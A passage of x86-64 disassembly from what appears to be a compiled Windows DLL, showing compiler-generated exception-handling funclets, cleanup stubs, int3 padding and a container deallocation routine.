   1800056a1:	e9 3a dc ff ff       	jmp    0x1800032e0
   1800056a6:	cc                   	int3
   1800056a7:	cc                   	int3
   1800056a8:	cc                   	int3
   1800056a9:	cc                   	int3
   1800056aa:	cc                   	int3
   1800056ab:	cc                   	int3
   1800056ac:	cc                   	int3
   1800056ad:	cc                   	int3
   1800056ae:	cc                   	int3
   1800056af:	cc                   	int3
   1800056b0:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   1800056b7:	e9 f4 cb ff ff       	jmp    0x1800022b0
   1800056bc:	40 55                	rex push %rbp
   1800056be:	48 83 ec 20          	sub    $0x20,%rsp
   1800056c2:	48 8b ea             	mov    %rdx,%rbp
   1800056c5:	4c 8d 0d e4 cb ff ff 	lea    -0x341c(%rip),%r9        # 0x1800022b0
   1800056cc:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1800056d2:	ba 20 00 00 00       	mov    $0x20,%edx
   1800056d7:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   1800056db:	e8 0c ee ff ff       	call   0x1800044ec
   1800056e0:	48 83 c4 20          	add    $0x20,%rsp
   1800056e4:	5d                   	pop    %rbp
   1800056e5:	c3                   	ret
   1800056e6:	48 8d 8a 70 00 00 00 	lea    0x70(%rdx),%rcx
   1800056ed:	e9 de db ff ff       	jmp    0x1800032d0
   1800056f2:	cc                   	int3
   1800056f3:	cc                   	int3
   1800056f4:	cc                   	int3
   1800056f5:	cc                   	int3
   1800056f6:	cc                   	int3
   1800056f7:	cc                   	int3
   1800056f8:	cc                   	int3
   1800056f9:	cc                   	int3
   1800056fa:	cc                   	int3
   1800056fb:	cc                   	int3
   1800056fc:	cc                   	int3
   1800056fd:	cc                   	int3
   1800056fe:	cc                   	int3
   1800056ff:	cc                   	int3
   180005700:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   180005707:	e9 34 cb ff ff       	jmp    0x180002240
   18000570c:	cc                   	int3
   18000570d:	cc                   	int3
   18000570e:	cc                   	int3
   18000570f:	cc                   	int3
   180005710:	40 55                	rex push %rbp
   180005712:	48 83 ec 20          	sub    $0x20,%rsp
   180005716:	48 8b ea             	mov    %rdx,%rbp
   180005719:	8b 45 20             	mov    0x20(%rbp),%eax
   18000571c:	83 e0 01             	and    $0x1,%eax
   18000571f:	85 c0                	test   %eax,%eax
   180005721:	74 0d                	je     0x180005730
   180005723:	83 65 20 fe          	andl   $0xfffffffe,0x20(%rbp)
   180005727:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   18000572b:	e8 a0 ca ff ff       	call   0x1800021d0
   180005730:	48 83 c4 20          	add    $0x20,%rsp
   180005734:	5d                   	pop    %rbp
   180005735:	c3                   	ret
   180005736:	cc                   	int3
   180005737:	cc                   	int3
   180005738:	cc                   	int3
   180005739:	cc                   	int3
   18000573a:	cc                   	int3
   18000573b:	cc                   	int3
   18000573c:	cc                   	int3
   18000573d:	cc                   	int3
   18000573e:	cc                   	int3
   18000573f:	cc                   	int3
   180005740:	40 55                	rex push %rbp
   180005742:	48 83 ec 20          	sub    $0x20,%rsp
   180005746:	48 8b ea             	mov    %rdx,%rbp
   180005749:	8b 45 30             	mov    0x30(%rbp),%eax
   18000574c:	83 e0 01             	and    $0x1,%eax
   18000574f:	85 c0                	test   %eax,%eax
   180005751:	74 0d                	je     0x180005760
   180005753:	83 65 30 fe          	andl   $0xfffffffe,0x30(%rbp)
   180005757:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   18000575b:	e8 70 ca ff ff       	call   0x1800021d0
   180005760:	48 83 c4 20          	add    $0x20,%rsp
   180005764:	5d                   	pop    %rbp
   180005765:	c3                   	ret
   180005766:	48 8d 8a 48 00 00 00 	lea    0x48(%rdx),%rcx
   18000576d:	e9 3e cb ff ff       	jmp    0x1800022b0
   180005772:	48 8d 8a b0 02 00 00 	lea    0x2b0(%rdx),%rcx
   180005779:	e9 32 cb ff ff       	jmp    0x1800022b0
   18000577e:	cc                   	int3
   18000577f:	cc                   	int3
   180005780:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   180005787:	e9 a4 cb ff ff       	jmp    0x180002330
   18000578c:	48 8d 8a c8 00 00 00 	lea    0xc8(%rdx),%rcx
   180005793:	e9 a8 ca ff ff       	jmp    0x180002240
   180005798:	48 8d 8a 98 00 00 00 	lea    0x98(%rdx),%rcx
   18000579f:	e9 2c ca ff ff       	jmp    0x1800021d0
   1800057a4:	48 8d 8a b0 00 00 00 	lea    0xb0(%rdx),%rcx
   1800057ab:	e9 20 ca ff ff       	jmp    0x1800021d0
   1800057b0:	48 8d 8a 80 00 00 00 	lea    0x80(%rdx),%rcx
   1800057b7:	e9 14 ca ff ff       	jmp    0x1800021d0
   1800057bc:	cc                   	int3
   1800057bd:	cc                   	int3
   1800057be:	cc                   	int3
   1800057bf:	cc                   	int3
   1800057c0:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   1800057c7:	e9 34 db ff ff       	jmp    0x180003300
   1800057cc:	cc                   	int3
   1800057cd:	cc                   	int3
   1800057ce:	cc                   	int3
   1800057cf:	cc                   	int3
   1800057d0:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   1800057d7:	e9 14 db ff ff       	jmp    0x1800032f0
   1800057dc:	40 55                	rex push %rbp
   1800057de:	48 83 ec 20          	sub    $0x20,%rsp
   1800057e2:	48 8b ea             	mov    %rdx,%rbp
   1800057e5:	80 7d 20 00          	cmpb   $0x0,0x20(%rbp)
   1800057e9:	75 16                	jne    0x180005801
   1800057eb:	4c 8b 4d 78          	mov    0x78(%rbp),%r9
   1800057ef:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   1800057f3:	48 8b 55 68          	mov    0x68(%rbp),%rdx
   1800057f7:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1800057fb:	e8 58 ed ff ff       	call   0x180004558
   180005800:	90                   	nop
   180005801:	48 83 c4 20          	add    $0x20,%rsp
   180005805:	5d                   	pop    %rbp
   180005806:	c3                   	ret
   180005807:	cc                   	int3
   180005808:	40 53                	rex push %rbx
   18000580a:	55                   	push   %rbp
   18000580b:	48 83 ec 28          	sub    $0x28,%rsp
   18000580f:	48 8b ea             	mov    %rdx,%rbp
   180005812:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   180005816:	48 8b 45 30          	mov    0x30(%rbp),%rax
   18000581a:	48 8b 08             	mov    (%rax),%rcx
   18000581d:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   180005821:	48 8b 45 28          	mov    0x28(%rbp),%rax
   180005825:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   18000582b:	74 0c                	je     0x180005839
   18000582d:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   180005834:	8b 45 20             	mov    0x20(%rbp),%eax
   180005837:	eb 22                	jmp    0x18000585b
   180005839:	e8 4a fc ff ff       	call   0x180005488
   18000583e:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   180005842:	48 89 08             	mov    %rcx,(%rax)
   180005845:	48 8b 45 30          	mov    0x30(%rbp),%rax
   180005849:	48 8b 58 08          	mov    0x8(%rax),%rbx
   18000584d:	e8 3c fc ff ff       	call   0x18000548e
   180005852:	48 89 18             	mov    %rbx,(%rax)
   180005855:	e8 58 fc ff ff       	call   0x1800054b2
   18000585a:	90                   	nop
   18000585b:	48 83 c4 28          	add    $0x28,%rsp
   18000585f:	5d                   	pop    %rbp
   180005860:	5b                   	pop    %rbx
   180005861:	c3                   	ret
   180005862:	cc                   	int3
   180005863:	40 55                	rex push %rbp
   180005865:	48 8b ea             	mov    %rdx,%rbp
   180005868:	48 8b 01             	mov    (%rcx),%rax
   18000586b:	33 c9                	xor    %ecx,%ecx
   18000586d:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   180005873:	0f 94 c1             	sete   %cl
   180005876:	8b c1                	mov    %ecx,%eax
   180005878:	5d                   	pop    %rbp
   180005879:	c3                   	ret
   18000587a:	cc                   	int3
   18000587b:	40 55                	rex push %rbp
   18000587d:	48 83 ec 20          	sub    $0x20,%rsp
   180005881:	48 8b ea             	mov    %rdx,%rbp
   180005884:	8a 4d 40             	mov    0x40(%rbp),%cl
   180005887:	48 83 c4 20          	add    $0x20,%rsp
   18000588b:	5d                   	pop    %rbp
   18000588c:	e9 ef ef ff ff       	jmp    0x180004880
   180005891:	cc                   	int3
   180005892:	40 55                	rex push %rbp
   180005894:	48 83 ec 20          	sub    $0x20,%rsp
   180005898:	48 8b ea             	mov    %rdx,%rbp
   18000589b:	8a 4d 20             	mov    0x20(%rbp),%cl
   18000589e:	e8 dd ef ff ff       	call   0x180004880
   1800058a3:	90                   	nop
   1800058a4:	48 83 c4 20          	add    $0x20,%rsp
   1800058a8:	5d                   	pop    %rbp
   1800058a9:	c3                   	ret
   1800058aa:	cc                   	int3
   1800058ab:	40 55                	rex push %rbp
   1800058ad:	48 83 ec 20          	sub    $0x20,%rsp
   1800058b1:	48 8b ea             	mov    %rdx,%rbp
   1800058b4:	48 83 c4 20          	add    $0x20,%rsp
   1800058b8:	5d                   	pop    %rbp
   1800058b9:	e9 4e ee ff ff       	jmp    0x18000470c
   1800058be:	cc                   	int3
   1800058bf:	40 55                	rex push %rbp
   1800058c1:	48 83 ec 30          	sub    $0x30,%rsp
   1800058c5:	48 8b ea             	mov    %rdx,%rbp
   1800058c8:	48 8b 01             	mov    (%rcx),%rax
   1800058cb:	8b 10                	mov    (%rax),%edx
   1800058cd:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1800058d2:	89 54 24 20          	mov    %edx,0x20(%rsp)
   1800058d6:	4c 8d 0d 7b f0 ff ff 	lea    -0xf85(%rip),%r9        # 0x180004958
   1800058dd:	4c 8b 45 70          	mov    0x70(%rbp),%r8
   1800058e1:	8b 55 68             	mov    0x68(%rbp),%edx
   1800058e4:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   1800058e8:	e8 8f ed ff ff       	call   0x18000467c
   1800058ed:	90                   	nop
   1800058ee:	48 83 c4 30          	add    $0x30,%rsp
   1800058f2:	5d                   	pop    %rbp
   1800058f3:	c3                   	ret
   1800058f4:	cc                   	int3
   1800058f5:	cc                   	int3
   1800058f6:	cc                   	int3
   1800058f7:	cc                   	int3
   1800058f8:	cc                   	int3
   1800058f9:	cc                   	int3
   1800058fa:	cc                   	int3
   1800058fb:	cc                   	int3
   1800058fc:	cc                   	int3
   1800058fd:	cc                   	int3
   1800058fe:	cc                   	int3
   1800058ff:	cc                   	int3
   180005900:	48 8d 0d 51 5e 00 00 	lea    0x5e51(%rip),%rcx        # 0x18000b758
   180005907:	e9 34 d1 ff ff       	jmp    0x180002a40
   18000590c:	cc                   	int3
   18000590d:	cc                   	int3
   18000590e:	cc                   	int3
   18000590f:	cc                   	int3
   180005910:	48 8d 0d 29 5e 00 00 	lea    0x5e29(%rip),%rcx        # 0x18000b740
   180005917:	e9 a4 d0 ff ff       	jmp    0x1800029c0
   18000591c:	cc                   	int3
   18000591d:	cc                   	int3
   18000591e:	cc                   	int3
   18000591f:	cc                   	int3
   180005920:	48 83 ec 38          	sub    $0x38,%rsp
   180005924:	48 8b 0d 45 5e 00 00 	mov    0x5e45(%rip),%rcx        # 0x18000b770
   18000592b:	48 85 c9             	test   %rcx,%rcx
   18000592e:	74 4a                	je     0x18000597a
   180005930:	48 8b 15 49 5e 00 00 	mov    0x5e49(%rip),%rdx        # 0x18000b780
   180005937:	48 2b d1             	sub    %rcx,%rdx
   18000593a:	48 83 e2 fc          	and    $0xfffffffffffffffc,%rdx
   18000593e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180005945:	72 18                	jb     0x18000595f
   180005947:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   18000594b:	48 83 c2 27          	add    $0x27,%rdx
   18000594f:	48 2b c8             	sub    %rax,%rcx
   180005952:	48 83 e9 08          	sub    $0x8,%rcx
   180005956:	48 83 f9 1f          	cmp    $0x1f,%rcx
   18000595a:	77 23                	ja     0x18000597f
   18000595c:	48 8b c8             	mov    %rax,%rcx
   18000595f:	e8 c0 ef ff ff       	call   0x180004924
   180005964:	0f 57 c0             	xorps  %xmm0,%xmm0
   180005967:	48 c7 05 fe 5d 00 00 	movq   $0x0,0x5dfe(%rip)        # 0x18000b770
   18000596e:	00 00 00 00 
   180005972:	f3 0f 7f 05 fe 5d 00 	movdqu %xmm0,0x5dfe(%rip)        # 0x18000b778
   180005979:	00 
   18000597a:	48 83 c4 38          	add    $0x38,%rsp
   18000597e:	c3                   	ret
   18000597f:	45 33 c9             	xor    %r9d,%r9d
   180005982:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180005989:	00 00 
   18000598b:	45 33 c0             	xor    %r8d,%r8d
   18000598e:	33 d2                	xor    %edx,%edx
   180005990:	33 c9                	xor    %ecx,%ecx
   180005992:	ff 15 a8 08 00 00    	call   *0x8a8(%rip)        # 0x180006240
   180005998:	cc                   	int3
